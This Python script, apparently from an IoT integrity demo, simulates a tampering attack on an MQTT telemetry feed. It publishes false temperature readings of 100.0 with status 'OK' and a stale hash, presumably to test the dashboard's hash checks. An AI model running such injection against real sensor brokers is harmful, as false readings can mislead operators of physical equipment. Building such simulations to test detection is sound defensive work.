import json
import time
import random
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

from config import (
    BROKER, PORT, TOPIC, QOS, DEVICE_ID, PUBLISH_INTERVAL_SEC,
    TEMP_MIN, TEMP_MAX, PRESSURE_MIN, PRESSURE_MAX
)

import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "dashboard")))
from integrity import sha256_hash


def main():
    client = mqtt.Client(client_id=f"{DEVICE_ID}_attacker", clean_session=True)
    client.connect(BROKER, PORT, keepalive=60)
    client.loop_start()

    temp = random.uniform(TEMP_MIN, TEMP_MAX)
    pressure = random.uniform(PRESSURE_MIN, PRESSURE_MAX)

    print(f"ATTACK MODE publishing to broker={BROKER}, topic={TOPIC}")
    print("This script will inject a false temperature while keeping status OK and not updating hash.")

    try:
        while True:
            temp += random.uniform(-0.4, 0.6)
            temp = max(50.0, min(110.0, temp))

            pressure += random.uniform(-0.3, 0.3)
            pressure = max(10.0, min(55.0, pressure))

            # Build a legitimate payload first
            legit_payload = {
                "device_id": DEVICE_ID,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "temperature": round(temp, 2),
                "pressure": round(pressure, 2),
                "status": "OK"
            }

            legit_payload["hash"] = sha256_hash(legit_payload)

            # Now tamper with temperature but keep old hash
            tampered_payload = dict(legit_payload)
            tampered_payload["temperature"] = 100.0
            tampered_payload["status"] = "OK"
            # hash remains the same intentionally (tamper simulation)

            client.publish(TOPIC, json.dumps(tampered_payload), qos=QOS, retain=False)

            print(tampered_payload)
            time.sleep(PUBLISH_INTERVAL_SEC)

    except KeyboardInterrupt:
        print("\nStopping attacker...")

    finally:
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()
